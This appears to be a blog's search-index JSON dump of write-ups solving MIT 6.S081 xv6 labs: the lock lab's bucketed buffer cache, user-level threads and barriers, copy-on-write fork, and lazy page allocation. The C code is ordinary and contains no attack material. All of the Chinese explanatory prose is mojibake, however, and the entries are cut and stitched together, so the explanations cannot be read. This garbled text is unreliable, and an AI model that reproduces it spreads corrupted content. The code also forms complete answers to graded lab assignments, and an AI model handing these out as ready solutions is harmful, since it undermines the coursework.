circular linked list // head.next is the first elem // head.prev is the last(LRU) elem struct buf *head = \u0026bcache.head[i]; head-\u003eprev = head; head-\u003enext = head; } int i; // Average distribut buf to each bucket for (b = bcache.buf, i = 0; b \u003c bcache.buf + NBUF; b++, i = (i + 1) % NBUCKET) { b-\u003enext = bcache.head[i].next; b-\u003eprev = \u0026bcache.head[i]; bcache.head[i].next-\u003eprev = b; bcache.head[i].next = b; initsleeplock(\u0026b-\u003elock, \"buffer\"); } } ä¿®æ”¹æœ€å…³é”®çš„bgetï¼š static struct buf* bget(uint dev, uint blockno) { struct buf *b; uint idx = ihash(blockno); acquire(\u0026bcache.lock[idx]); for (b = bcache.head[idx].next; b != \u0026bcache.head[idx]; b = b-\u003enext) { if(b-\u003edev == dev \u0026\u0026 b-\u003eblockno == blockno) { b-\u003erefcnt++; release(\u0026bcache.lock[idx]); acquiresleep(\u0026b-\u003elock); return b; } } // Not cached, find LRU for (b = bcache.head[idx].prev; b != \u0026bcache.head[idx]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; release(\u0026bcache.lock[idx]); acquiresleep(\u0026b-\u003elock); return b; } } release(\u0026bcache.lock[idx]); acquire(\u0026bcache.steal_lock); acquire(\u0026bcache.lock[idx]); for (b = bcache.head[idx].next; b != \u0026bcache.head[idx]; b = b-\u003enext) { if(b-\u003edev == dev \u0026\u0026 b-\u003eblockno == blockno) { b-\u003erefcnt++; release(\u0026bcache.lock[idx]); release(\u0026bcache.steal_lock); acquiresleep(\u0026b-\u003elock); return b; } } // Not cached, find LRU for (b = bcache.head[idx].prev; b != \u0026bcache.head[idx]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; release(\u0026bcache.lock[idx]); release(\u0026bcache.steal_lock); acquiresleep(\u0026b-\u003elock); return b; } } // steal from other bucket uint _idx = idx; idx = ihash(idx + 1); while (idx != _idx) { acquire(\u0026bcache.lock[idx]); // Not cached; recycle an unused buffer. for (b = bcache.head[idx].prev; b != \u0026bcache.head[idx]; b = b-\u003eprev) { if (b-\u003erefcnt == 0) { b-\u003edev = dev; b-\u003eblockno = blockno; b-\u003evalid = 0; b-\u003erefcnt = 1; b-\u003eprev-\u003enext = b-\u003enext; b-\u003enext-\u003eprev = b-\u003eprev; release(\u0026bcache.lock[idx]); b-\u003enext = bcache.head[_idx].next; b-\u003eprev = \u0026bcache.head[_idx]; b-\u003enext-\u003eprev = b; b-\u003eprev-\u003enext = b; release(\u0026bcache.lock[_idx]); release(\u0026bcache.steal_lock); acquiresleep(\u0026b-\u003elock); return b; } } release(\u0026bcache.lock[idx]); idx = ihash(idx + 1); } release(\u0026bcache.lock[_idx]); release(\u0026bcache.steal_lock); panic(\"bget: no buffers\"); } ä¸Šé¢çš„ä»£ç ä¸­ï¼Œåœ¨å½“å‰bucketä¸­ä¸¤æ¬¡æŸ¥çœ‹blockæ˜¯å¦å·²ç»è¢«ç¼“å­˜æˆ–è€…æœ‰ç©ºé—²bufå¯ç”¨ï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨äº†æ•´ä¸ªbcacheçš„å¤§é”ã€‚åœ¨æˆ‘æœ€å¼€å§‹çš„è®¾è®¡ä¸­ï¼Œå½“å‰bucketä¸­æ‰¾ä¸åˆ°å¯ç”¨bufæ—¶ï¼Œç›´æ¥å°è¯•ä»å…¶ä»–bucket stealï¼Œè¿™ä¼šå¯¼è‡´æ½œåœ¨çš„æ­»é”é—®é¢˜ï¼Œå½“å‡ºç° A steal from Bï¼ŒB steal from A çš„æƒ…å†µï¼Œå°±ä¼šæ­»é”ï¼Œè¿™ç§æƒ…å†µä»£è¡¨äº†æ‰€æœ‰bufè¢«æ¶ˆè€—æ®†å°½ï¼Œè¿™æ—¶åº”è¯¥æ‰§è¡Œåˆ°æœ«å°¾çš„panicï¼Œè€Œä¸èƒ½æ­»é”åœ¨è¿™é‡Œã€‚ æµ‹è¯•ä¸­åº”è¯¥æ²¡æœ‰åŒæ—¶æ¶ˆè€—æ‰æ‰€æœ‰bufï¼Œæ‰€ä»¥æ­»é”å¹¶ä¸ä¼šå‡ºç°ï¼Œä½†è¿˜æ˜¯åº”è¯¥åœ¨è®¾è®¡ä¸Šé¿å…æ­»é”ï¼Œæ‰€ä»¥ä½¿ç”¨äº†æ•´ä¸ªbcacheçš„å¤§é”steal_lockã€‚å½“ä»»ä½•è¿›ç¨‹æƒ³è¦ä»å…¶ä»–bucket steal bufæ—¶ï¼Œéœ€è¦æŒæœ‰è¯¥é”ï¼Œå¹¶ä¸”éœ€è¦é‡å¤ä¹‹å‰çš„æ‰«ææ“ä½œï¼Œé˜²æ­¢æ‰§è¡Œç©ºéš™ä¸­æœ‰å…¶ä»–è¿›ç¨‹ç¼“å­˜äº†å¯¹åº”blockï¼Œç ´åæ“ä½œçš„åŸå­æ€§ï¼Œå¯¼è‡´ä¸€ä¸ªblockè¢«ç¼“å­˜ä¸¤æ¬¡ã€‚steal_lockä»…å½±å“ stealï¼Œå½“steal_lockè¢«æŒæœ‰ï¼Œä¸å‚ä¸ steal çš„å…¶ä»–bucketä»å¯ä»¥è¢«å¹¶å‘åœ°bget()ã€‚è¯¥è®¾è®¡éœ€è¦æ„Ÿè°¢çŸ¥ä¹iced coffeã€‚ ä¹‹","date":"2021-03-01","objectID":"/posts/6-s081-lab8-lock/:2:0","tags":["6.S081","lock"],"title":"6.S081 lab8 lock","uri":"/posts/6-s081-lab8-lock/"},{"categories":["OS"],"content":"æœ¬å®éªŒå®¤å°†è®©ä½ ç†Ÿæ‚‰å¤šçº¿ç¨‹ã€‚æ‚¨å°†åœ¨ç”¨æˆ·çº§çº¿ç¨‹åŒ…ä¸­å®ç°çº¿ç¨‹åˆ‡æ¢ï¼›ä½¿ç”¨å¤šçº¿ç¨‹æ¥åŠ å¿«ç¨‹åºçš„é€Ÿåº¦ï¼›å¹¶å®ç°ä¸€ä¸ªbarrierã€‚ ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:0:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Uthread: switching between threads å®éªŒä»£ç ä¸­ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªç”¨æˆ·çº§åˆ«çº¿ç¨‹åº“ï¼Œéœ€è¦æˆ‘ä»¬å®ç°çº¿ç¨‹åˆ‡æ¢éƒ¨åˆ†ã€‚æˆ‘ä»¬éœ€è¦ç»™user/uthread.cä¸­çš„thread_create()å’Œthread_schedule()ï¼Œä»¥åŠuser/uthread_switch.Sä¸­çš„thread_switchæ·»åŠ ä»£ç ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬ä¸ºthreadæ·»åŠ contextä»¥ä¿å­˜calleeå¯„å­˜å™¨å€¼ï¼Œä»kernel/proc.hä¸­å¤åˆ¶å³å¯ã€‚ struct context { uint64 ra; uint64 sp; // callee-saved uint64 s0; uint64 s1; uint64 s2; uint64 s3; uint64 s4; uint64 s5; uint64 s6; uint64 s7; uint64 s8; uint64 s9; uint64 s10; uint64 s11; }; struct thread { char stack[STACK_SIZE]; /* the thread's stack */ int state; /* FREE, RUNNING, RUNNABLE */ struct context context; }; ç„¶åæ˜¯``thread_create()`ï¼š void thread_create(void (*func)()) { struct thread *t; for (t = all_thread; t \u003c all_thread + MAX_THREAD; t++) { if (t-\u003estate == FREE) break; } t-\u003estate = RUNNABLE; // YOUR CODE HERE // user ra return func in switch t-\u003econtext.ra = (uint64)func; // point to stack top(highest addr) t-\u003econtext.sp = (uint64)t-\u003estack + STACK_SIZE; } åˆ©ç”¨raåœ¨ switch åˆ° thread åï¼Œè¿”å›åˆ°å‡½æ•°çš„ä½ç½®ï¼Œå°†spæŒ‡å‘è¯¥threadçš„æ ˆé¡¶ã€‚ æœ€åæ˜¯thread_scheduleï¼š if (current_thread != next_thread) { /* switch threads? */ next_thread-\u003estate = RUNNING; t = current_thread; current_thread = next_thread; /* YOUR CODE HERE * Invoke thread_switch to switch from t to next_thread: * thread_switch(??, ??); */ thread_switch((uint64)\u0026t-\u003econtext, (uint64)\u0026current_thread-\u003econtext); } è‡³äºthread_switchçš„ä»£ç ï¼Œç›´æ¥ä»kernel/switch.Sä¸­å¤åˆ¶å³å¯ã€‚ ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:1:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Using threads åé¢çš„ä¸¤å…³éƒ½å’Œxv6æ— å…³äº†ï¼Œå¤§æ¦‚æ˜¯æœ‰ä¸€äº›å¤šçº¿ç¨‹çš„ featureï¼Œxv6æ— æ³•æä¾›ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬ä½¿ç”¨pthreadã€‚ å®éªŒä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ— é”çš„hashtableï¼Œå•çº¿ç¨‹ä¸‹æ‰§è¡Œæ— è¯¯ï¼Œä½†æ˜¯å¤šçº¿ç¨‹æ‰§è¡Œæ—¶ï¼Œä¼šå‘ç”Ÿå¦‚ä¸‹é—®é¢˜ï¼š â¯ ./ph 2 100000 puts, 1.780 seconds, 56190 puts/second 0: 16577 keys missing 1: 16577 keys missing 200000 gets, 4.343 seconds, 46055 gets/second è¿™æ˜¯å› ä¸ºï¼Œå½“ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ’å…¥hashtableçš„ä¸€ä¸ªbucketæ—¶ï¼Œä¼šå¯¼è‡´ key ä¸¢å¤±ã€‚ æˆ‘ä»¬å¯¹putæ“ä½œåŠ é”å³å¯ï¼ˆä¸è¦å¿˜äº†åœ¨main()å‡½æ•°ä¸­åˆå§‹åŒ–locksï¼‰ï¼š pthread_mutex_t locks[NBUCKET]; static void put(int key, int value) { int i = key % NBUCKET; pthread_mutex_lock(\u0026locks[i]); // is the key already present? struct entry *e = 0; for (e = table[i]; e != 0; e = e-\u003enext) { if (e-\u003ekey == key) break; } if(e){ // update the existing key. e-\u003evalue = value; } else { // the new is new. insert(key, value, \u0026table[i], table[i]); } pthread_mutex_unlock(\u0026locks[i]); } ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:2:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Barrier æœ¬å…³è¦æ±‚æˆ‘ä»¬å®ç°ä¸€ä¸ªbarrieï¼šåœ¨æŸä¸ªç‚¹ä¸Šï¼Œæ‰€æœ‰ç›¸å…³çš„çš„çº¿ç¨‹å¿…é¡»ç­‰å¾…ï¼Œç›´åˆ°æ‰€æœ‰å…¶ä»–ç›¸å…³çš„çº¿ç¨‹ä¹Ÿåˆ°è¾¾è¿™ä¸ªç‚¹ã€‚è¿™ä¸ªæˆ‘ä»¬å‚è€ƒxv6ä¸­çš„sleepå’Œwaitçš„ä½¿ç”¨å³å¯ï¼š static void barrier() { // YOUR CODE HERE // // Block until all threads have called barrier() and // then increment bstate.round. // pthread_mutex_lock(\u0026bstate.barrier_mutex); bstate.nthread++; if (bstate.nthread == nthread) { bstate.round++; bstate.nthread = 0; pthread_cond_broadcast(\u0026bstate.barrier_cond); } else { pthread_cond_wait(\u0026bstate.barrier_cond, \u0026bstate.barrier_mutex); } pthread_mutex_unlock(\u0026bstate.barrier_mutex); } ","date":"2021-02-28","objectID":"/posts/6-s081-lab7-thread/:3:0","tags":["6.S081","Multithreading"],"title":"6.S081 lab7 thread","uri":"/posts/6-s081-lab7-thread/"},{"categories":["OS"],"content":"Copy-on-Write Fork for xv6 è¿™æ¬¡ lab åªæœ‰ä¸€å…³ï¼Œé‚£å°±æ˜¯ä¸ºxv6å®ç°copy on writeã€‚ xv6ä¸­çš„fork()ç³»ç»Ÿè°ƒç”¨å°†çˆ¶è¿›ç¨‹çš„ç”¨æˆ·å†…å­˜å…¨éƒ¨å¤åˆ¶åˆ°å­è¿›ç¨‹ä¸­ã€‚å¦‚æœçˆ¶è¿›ç¨‹å†…å­˜å ç”¨å¾ˆå¤§ï¼Œå¤åˆ¶å¯èƒ½éœ€è¦å¾ˆé•¿çš„æ—¶é—´ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œé€šå¸¸æ¥è¯´ï¼Œè¿™ä¸ªå¤åˆ¶åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯æµªè´¹çš„ï¼›ä¾‹å¦‚ï¼Œåœ¨å­è¿›ç¨‹ä¸­ï¼Œfork()ä¹‹åçš„exec()è°ƒç”¨ä¼šå¯¼è‡´å­è¿›ç¨‹ä¸¢å¼ƒå¤åˆ¶çš„å†…å­˜ï¼Œå¯èƒ½å¤§éƒ¨åˆ†å†…å­˜éƒ½æ²¡æœ‰æ¥å¾—åŠä½¿ç”¨ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœçˆ¶å­åŒæ–¹éƒ½ä½¿ç”¨ä¸€ä¸ªpageï¼Œå¹¶ä¸”å…¶ä¸­ä¸€æ–¹æˆ–åŒæ–¹éœ€è¦å†™è¿™ä¸ªpageï¼Œé‚£ä¹ˆç¡®å®éœ€è¦å¤åˆ¶ã€‚ æ ¹æ®å®˜ç½‘ç»™çš„æç¤ºï¼š ä½¿ç”¨å¼•ç”¨è®¡æ•°ï¼Œå¯¹æ¯ä¸ªç‰©ç†é¡µé¢ç»´æŠ¤ä¸€ä¸ªreference countï¼Œè®°å½•ç‰©ç†é¡µé¢è¢« map çš„æ¬¡æ•°ã€‚ kernel/kalloc.c struct { struct spinlock lock; struct run *freelist; int rc[PHYSTOP / PGSIZE]; } kmem; void freerange(void *pa_start, void *pa_end) { char *p; p = (char*)PGROUNDUP((uint64)pa_start); for(; p + PGSIZE \u003c= (char*)pa_end; p += PGSIZE) { kmem.rc[(uint64)p / PGSIZE] = 1; kfree(p); } } void increase_rc(uint64 pa) { acquire(\u0026kmem.lock); kmem.rc[pa / PGSIZE]++; release(\u0026kmem.lock); } åˆ©ç”¨ RISC-V PTE ä¸­çš„RSW (reserved for software)ä½æ¥æ ‡è®°cowé¡µï¼Œä¿®æ”¹uvmcopy(),åœ¨å¤åˆ¶å†…å­˜æ—¶ï¼Œä»…å°†çˆ¶è¿›ç¨‹çš„ç‰©ç†é¡µé¢ map åˆ°å­è¿›ç¨‹é¡µè¡¨ä¸­ï¼Œå¹¶æ¸…é™¤åŒæ–¹PTEä¸­çš„PTE_Wæ ‡å¿—ã€‚ åœ¨kernel/riscv.hä¸­åŠ å…¥ï¼š #define PTE_COW (1L \u003c\u003c 8) åœ¨kernel/vm.cä¸­åŠ å…¥ï¼š int uvmcopy(pagetable_t old, pagetable_t new, uint64 sz) { pte_t *pte; uint64 pa, i; uint flags; for(i = 0; i \u003c sz; i += PGSIZE){ if((pte = walk(old, i, 0)) == 0) panic(\"uvmcopy: pte should exist\"); if((*pte \u0026 PTE_V) == 0) panic(\"uvmcopy: page not present\"); pa = PTE2PA(*pte); flags = PTE_FLAGS(*pte); // only for writable page if (flags \u0026 PTE_W) { flags = (flags | PTE_COW) \u0026 (~PTE_W); *pte = PA2PTE(pa) | flags; } increase_rc(pa); if(mappages(new, i, PGSIZE, pa, flags) != 0){ goto err; } } return 0; err: uvmunmap(new, 0, i / PGSIZE, 1); return -1; } æ³¨æ„mappageså¤±è´¥æ—¶ï¼Œåˆ æ‰åŸæœ‰çš„kfree(mem)ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰ç”³è¯·æ–°çš„å†…å­˜ã€‚ å‘ç”Ÿpage falutæ—¶ï¼Œåœ¨usertrap()ä¸­æ•è·ï¼Œå¯¹cow pageåˆ†é…çœŸæ­£çš„ç‰©ç†å†…å­˜ã€‚ kernel/kalloc.c int cow_alloc(pagetable_t pagetable, uint64 va) { uint64 pa; uint64 mem; pte_t *pte; if (va \u003e= MAXVA) return -1; va = PGROUNDDOWN(va); pte = walk(pagetable, va, 0); if (pte == 0) { return -1; } // not a valid cow page if (!(*pte \u0026 PTE_V)) { return -2; } pa = PTE2PA(*pte); // only one rf, make it writable acquire(\u0026kmem.lock); if (kmem.rc[pa / PGSIZE] == 1) { *pte \u0026= ~PTE_COW; *pte |= PTE_W; release(\u0026kmem.lock); return 0; } release(\u0026kmem.lock); if ((mem = (uint64)kalloc()) == 0){ return -3; } memmove((void *)mem, (void *)pa, PGSIZE); *pte = ((PA2PTE(mem) | PTE_FLAGS(*pte) | PTE_W) \u0026 (~PTE_COW)); // decrease rc kfree((void *)pa); return 0; } åœ¨æˆ‘çš„å®ç°ä¸­ï¼Œå½“cow pageå‘ç”Ÿpage faultï¼Œä¸”reference countä¸º 1 æ—¶ï¼Œä¸å†é‡æ–°åˆ†é…é¡µé¢è¿›è¡Œå¤åˆ¶ï¼Œè€Œæ˜¯ç›´æ¥å°†è¯¥é¡µé¢æ¶ˆå»PTE_COWå¹¶åŠ ä¸ŠPTE_Wï¼Œå‡å°‘å†…å­˜åˆ†é…å’Œå¤åˆ¶æ“ä½œã€‚ åœ¨kernel/trap.cï¼š else if(r_scause() == 13 || r_scause() == 15) { va = r_stval(); if (va \u003c PGROUNDDOWN(p-\u003etrapframe-\u003esp) \u0026\u0026 va \u003e= PGROUNDDOWN(p-\u003etrapframe-\u003esp) - PGSIZE) { // guard page p-\u003ekilled = 1; } else { int ret; if((ret = cow_alloc(p-\u003epagetable, va)) \u003c 0 ) { p-\u003ekilled = 1; } } } å½“ä½¿ç”¨kalloc()è¿›è¡Œå†…å­˜åˆ†é…æ—¶ï¼Œéœ€è¦å°†å¯¹åº”pageçš„reference countè®¾ç½®ä¸º 1ï¼Œä½¿ç”¨kfree()é‡Šæ”¾å†…å­˜æ—¶ï¼Œåªèƒ½å°†reference countä¸º 0 çš„é¡µé¢æ”¾å›ç©ºé—²åˆ—è¡¨ã€‚ kernel/kalloc.cï¼š void * kalloc(void) { struct run *r; acquire(\u0026kmem.lock); r = kmem.freelist; if(r) { kmem.freelist = r-\u003enext; kmem.rc[(uint64)r / PGSIZE] = 1; } release(\u0026kmem.lock); if(r) memset((char*)r, 5, PGSIZE); // fill with junk return (void*)r; } void kfree(void *pa) { struct run *r; if(((uint64)pa % PGSIZE) != 0 || (char*)pa \u003c end || (uint64)pa \u003e= PHYSTOP) panic(\"kfree\"); acquire(\u0026kmem.lock); kmem.rc[(uint64)pa / PGSIZE]--; if(kmem.rc[(uint64)pa / PGSIZE] \u003c= 0) { memset(pa, 1, PGSIZE); r = (struct run*)pa; r-\u003enext = kmem.freelist; kmem.freelist = r; } release(\u0026kmem.lock); } æ³¨æ„ï¼škfree()ä¸­ï¼Œå¯¹äºkmem.rc[(uint64)pa / PGSIZE]çš„ä¿®æ”¹å’Œè¯»å–å¿…é¡»æ˜¯ä¸€ä¸ªåŸå­æ“ä½œï¼Œå¦åˆ™å†…å­˜å¯èƒ½è¢«é‡å¤é‡Šæ”¾ï¼Œä¾‹å¦‚å¯¹äºæŸä¸ªç‰©ç†pageï¼ŒåŒæ—¶ map åˆ° Aã€B çš„é¡µè¡¨ä¸­ï¼Œä¹‹åï¼š A : ref - 1 B : ref - 1 A : ref == 0 =\u003e free B : ref == 0 =\u003e free æœ€åï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹copyout()ï¼ŒåŒlazy allocationä¸€æ ·ï¼Œå½“å› ä¸ºç³»ç»Ÿè°ƒç”¨åˆ‡æ¢åˆ°å†…æ ¸é¡µè¡¨æ—¶ï¼Œç¡¬ä»¶æ— æ³•å†ä¸ºå†™cow pageäº§ç”Ÿpage faultï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å¤„ç†ï¼š int copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len) { uint64 n, va0, pa0; while(len \u003e 0){ va0 = PGROUNDDOWN(dstva); cow_alloc(pagetable, va0); pa0 = walkaddr(pagetable, va0); if(pa0 == 0) return -1; n = PGSIZE - (dstva - va0); if(n \u003e len) n = len; memmove((void *)(pa0 + (dstva - va0)), src, n); len -= n; src += n; dstva = va0 + PGSIZE; } return 0; } è‡³æ­¤ä¾¿å®Œæˆäº† lab6 copy on writeã€‚ ","date":"2021-02-27","objectID":"/posts/6-s081-lab6-cow/:1:0","tags":["6.S081","cow"],"title":"6.S081 lab6 cow","uri":"/posts/6-s081-lab6-cow/"},{"categories":["OS"],"content":"Eliminate allocation from sbrk() è¿™æ¬¡å®éªŒçš„ç¬¬ä¸€å…³éå¸¸ç®€å•ï¼Œå°±æ˜¯ä»sbrkè°ƒç”¨ä¸­å–æ¶ˆå†…å­˜åˆ†é…ï¼Œä¸ºä¹‹åçš„lay allocationåšå‡†å¤‡ã€‚ uint64 sys_sbrk(void) { int addr; int n; if(argint(0, \u0026n) \u003c 0) return -1; struct proc *p = myproc(); addr = p-\u003esz; p-\u003esz += n; return addr; } hints æç¤ºæˆ‘ä»¬ï¼Œä¿®æ”¹å®Œä»£ç åï¼Œå°è¯•è¿è¡Œecho hiï¼Œä¼šäº§ç”Ÿç±»ä¼¼ä¸‹é¢çš„ç»“æœ: $ echo hi usertrap(): unexpected scause 0x000000000000000f pid=3 sepc=0x0000000000001258 stval=0x0000000000004008 va=0x0000000000004000 pte=0x0000000000000000 panic: uvmunmap: not mapped å…¶å®å¹¶ä¸ä¸€å®šæ˜¯echoæ‰ä¼šå¯¼è‡´ crashï¼Œå…¶ä»–çš„æ‰§è¡Œä»»æ„çš„å‘½ä»¤æˆ–è€…è¾“å…¥æ— æ„ä¹‰å­—ç¬¦éƒ½ä¼šå¯¼è‡´ crashã€‚åœ¨user/umalloc.cä¸­ï¼Œmorecoreè°ƒç”¨äº†sbrkï¼Œmallocè°ƒç”¨äº†morecoreã€‚åœ¨user/sh.cä¸­ï¼Œshell è¿è¡Œè¿‡ç¨‹ä¸­ä¸æ–­åœ°è°ƒç”¨mallocä¸º command ç”³è¯·åˆ†é…ç©ºé—´ï¼Œç„¶åè¿è¡Œ commandã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œmalloc å¹¶æœªçœŸæ­£åˆ†é…ç©ºé—´ï¼Œè¿è¡Œæ—¶è®¿é—®åˆ°å¯¹åº”è™šæ‹Ÿåœ°å€å°±ä¼šäº§ç”Ÿ page faultï¼Œå¯¼è‡´ panicï¼› ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:1:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"Lazy allocation è¿™ä¸€å…³éœ€è¦æˆ‘ä»¬å®ç°lazy allocationï¼Œåœ¨usertrap()ä¸­å¤„ç†page faultï¼Œä¸ºäº§ç”Ÿpage faultçš„è™šæ‹Ÿåœ°å€åˆ†é…ä¸€ä¸ªçœŸå®çš„ç‰©ç†é¡µé¢ï¼Œå¹¶ map åˆ°å¯¹åº”è™šæ‹Ÿåœ°å€ã€‚ r_scause()ç”¨äºè·å– trap äº§ç”Ÿçš„åŸå› ï¼Œä¸º 13/15 æ—¶ä¸ºpage faultã€‚ r_stval()è·å–stvalå¯„å­˜å™¨å€¼ï¼Œå®ƒæ˜¯å¯¼è‡´page faultçš„è™šæ‹Ÿåœ°å€å€¼ã€‚ uvmunmap()ä¼š panicï¼Œå› ä¸ºè¿›ç¨‹åœ°å€ç©ºé—´æœ‰äº›è™šæ‹Ÿåœ°å€å¹¶æœªè¢« mapï¼Œæ‰€è¦åŠ ä»¥ä¿®æ”¹ã€‚ å‚ç…§uvmalloc()ï¼Œå®Œæˆå¦‚ä¸‹å‡½æ•°ï¼Œä¸ºè™šæ‹Ÿåœ°å€vaåˆ†é…ä¸€ä¸ªçœŸå®ç‰©ç†é¡µï¼š uint64 lazy_uvmalloc(pagetable_t pagetable, uint64 va) { char *mem; va = PGROUNDDOWN(va); mem = kalloc(); if(mem == 0){ return -1; } memset(mem, 0, PGSIZE); if(mappages(pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0) { kfree(mem); return -1; } return 0; } åœ¨usertrap()ä¸­åŠ å…¥å¯¹äºpage faultçš„å¤„ç†ï¼š else if(cause == 13 || cause == 15) { uint64 va = r_stval(); if(lazy_uvmalloc(p-\u003epagetable, va) != 0) { p-\u003ekilled = 1; } } æ·»åŠ ä»¥ä¸Šä»£ç ä¹‹åï¼Œåœ¨uvmunmap()ä¸­æ·»åŠ å¦‚ä¸‹ä¿®æ”¹ï¼Œå–æ¶ˆpanicï¼š if((pte = walk(pagetable, a, 0)) == 0) // panic(\"uvmunmap: walk\"); continue; if((*pte \u0026 PTE_V) == 0) // panic(\"uvmunmap: not mapped\"); continue; å®Œæˆå¦‚ä¸Šä»£ç åï¼Œecho hiå¯ä»¥æ­£å¸¸è¿è¡Œã€‚ ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:2:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 lazy","uri":"/posts/6-s081-lab5-lazy/"},{"categories":["OS"],"content":"Lazytests and Usertests ç¬¬ä¸‰å…³éœ€è¦å¤„ç†ç¬¬äºŒå…³çš„ä¸€äº›é—ç•™ç»†èŠ‚é—®é¢˜ï¼Œå®Œå–„lazy allocationï¼Œä½¿ä¹‹é€šè¿‡å…¨éƒ¨æµ‹è¯•ã€‚ Handle negative sbrk() arguments. å¯¹äºè´Ÿæ•°å‚æ•°ï¼Œéœ€è¦unmapå¯¹åº”é¡µé¢: if(n \u003c 0){ p-\u003esz = uvmdealloc(p-\u003epagetable, p-\u003esz, p-\u003esz + n); } else { p-\u003esz += n; } Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk(). Handle faults on the invalid page below the user stack. è¿™é‡Œéœ€è¦åˆ¤æ–­äº§ç”Ÿpage faultçš„ va æ˜¯å¦åœ¨å½“å‰è¿›ç¨‹æ‹¥æœ‰çš„åœ°å€èŒƒå›´ä¹‹å¤–ã€‚ if (va \u003e= p-\u003esz || va \u003c p-\u003etrapframe-\u003esp) p-\u003ekilled = 1; Handle the parent-to-child memory copy in fork() correctly. åœ¨fork()ä¸­ï¼Œä½¿ç”¨å¦‚ä¸‹ä»£ç å°†å†…å­˜ä»çˆ¶è¿›ç¨‹å¤åˆ¶åˆ°å­è¿›ç¨‹ï¼š // Copy user memory from parent to child. if(uvmcopy(p-\u003epagetable, np-\u003epagetable, p-\u003esz) \u003c 0){ freeproc(np); release(\u0026np-\u003elock); return -1; } è¿›å…¥uvmcopy()ï¼Œåšå‡ºå¦‚ä¸‹ä¿®æ”¹ï¼š if((pte = walk(old, i, 0)) == 0) // panic(\"uvmcopy: pte should exist\"); continue; if((*pte \u0026 PTE_V) == 0) // panic(\"uvmcopy: page not present\"); continue; Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated. å½“è¿›ç¨‹è¿›è¡Œsyscallæ—¶ï¼Œä¼šé™·å…¥ kernelï¼Œæ­¤æ—¶stapåˆ‡æ¢ä¸ºå†…æ ¸é¡µè¡¨ï¼ŒRISC-Vç¡¬ä»¶æ— æ³•å†ä¸ºç”¨æˆ·åœ°å€ç©ºé—´äº§ç”Ÿpage faultï¼Œæ‰€ä»¥å½“ç”¨æˆ·æ‰§è¡Œread()å’Œwrite()ï¼Œå°†ç”¨æˆ·åœ°å€ç©ºé—´çš„æœ‰æ•ˆè™šæ‹Ÿåœ°å€ä¼ é€’ç»™å†…æ ¸æ—¶ï¼Œå¦‚æœè¯¥è™šæ‹Ÿåœ°å€æ²¡æœ‰ map åˆ°æœ‰æ•ˆç‰©ç†å†…å­˜ï¼Œå°†ä¼šå¯¼è‡´ç¨‹åº panicã€‚kernel è¿è¡Œæ—¶ï¼Œä½¿ç”¨walkaddrè¿›è¡Œè™šå®åœ°å€è½¬æ¢ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹å…¶ä¸­çš„ä»£ç ï¼Œå½“è™šæ‹Ÿåœ°å€æœ‰æ•ˆè€Œé¡µè¡¨ä¸­æœª map æ—¶ï¼Œå°è¯•ä¸ºå…¶åˆ†é…ç‰©ç†å†…å­˜ï¼š uint64 walkaddr(pagetable_t pagetable, uint64 va) { pte_t *pte; uint64 pa; struct proc *p = myproc(); if(va \u003e= MAXVA) return 0; pte = walk(pagetable, va, 0); if(pte == 0 || (*pte \u0026 PTE_V) == 0) { if (va \u003e= p-\u003esz || va \u003c p-\u003etrapframe-\u003esp) { return 0; } if(lazy_uvmalloc(pagetable, va) == 0) { pte = walk(pagetable, va, 0);; } else { return 0; } } if((*pte \u0026 PTE_U) == 0) return 0; pa = PTE2PA(*pte); return pa; } Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process. åœ¨å…³å¡ 2 ä¸­ï¼Œå·²ç»åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œå½“lazy_uvmalloc()è°ƒç”¨kalloc()å¤±è´¥æ—¶ï¼Œè¿”å›é 0ï¼Œæ€æ‰è¿›ç¨‹ï¼š if(lazy_uvmalloc(p-\u003epagetable, va) != 0) { p-\u003ekilled = 1; } åšå®Œå¦‚ä¸Šä¿®æ”¹ï¼Œä¾¿èƒ½é€šè¿‡æ‰€æœ‰æµ‹è¯•ã€‚ ","date":"2021-02-25","objectID":"/posts/6-s081-lab5-lazy/:3:0","tags":["6.S081","lazy allocation"],"title":"6.S081 lab5 